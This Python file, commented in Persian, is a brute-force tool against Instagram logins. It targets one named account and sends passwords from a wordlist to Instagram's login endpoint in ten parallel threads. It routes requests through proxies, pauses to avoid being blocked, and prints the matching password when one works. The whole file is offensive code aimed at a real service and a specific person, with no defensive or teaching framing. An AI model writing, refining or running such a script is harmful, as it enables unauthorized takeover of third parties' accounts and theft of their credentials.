import requests
import time
import threading
from queue import Queue

# اطلاعات ورودی
username = "moon_1905"  # نام کاربری اینستاگرام
password_file = "2.txt"  # فایل لیست پسوردها
login_url = "https://www.instagram.com/accounts/login/ajax/"  # آدرس لاگین اینستاگرام
max_retries = 3  # تعداد تلاش مجدد در صورت شکست درخواست
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
}  # هدرهای لازم برای درخواست
proxies = {"http": "http://your-proxy.com", "https": "https://your-proxy.com"}  # پراکسی‌ها

# باز کردن فایل پسوردها
try:
    with open(password_file, 'r') as file:
        passwords = file.readlines()  # خواندن تمام پسوردها از فایل
except FileNotFoundError:
    print("فایل پسورد لیست یافت نشد!")
    exit()

# صف برای ذخیره پسوردها و نتایج
password_queue = Queue()
for password in passwords:
    password_queue.put(password.strip())  # اضافه کردن پسوردها به صف

# تابع برای ارسال درخواست و تست پسورد
def test_password():
    while not password_queue.empty():
        password = password_queue.get()
        print(f"Trying password: {password}")

        retries = 0
        while retries < max_retries:
            try:
                session = requests.Session()
                login_data = {
                    "username": username,
                    "password": password
                }
                response = session.post(login_url, data=login_data, headers=headers, proxies=proxies, timeout=10)

                # بررسی وضعیت پاسخ
                if response.status_code == 200 and '"authenticated":true' in response.text:
                    # نمایش پسورد صحیح با رنگ سبز
                    print(f"\033[92mPassword found: {password}\033[0m")
                    return
                else:
                    print(f"Failed attempt with {password}")
                    retries += 1
                    time.sleep(1)  # تأخیر برای جلوگیری از بلاک شدن

            except requests.exceptions.RequestException as e:
                print(f"Request failed for {password}: {e}")
                retries += 1
                time.sleep(1)  # تأخیر در صورت خطا
        password_queue.task_done()

# ایجاد رشته‌ها برای پردازش موازی
threads = []
for _ in range(10):  # تعداد رشته‌ها را می‌توان تغییر داد
    thread = threading.Thread(target=test_password)
    thread.start()
    threads.append(thread)

# منتظر ماندن تا تکمیل شدن تمامی رشته‌ها
for thread in threads:
    thread.join()

print("Testing complete.")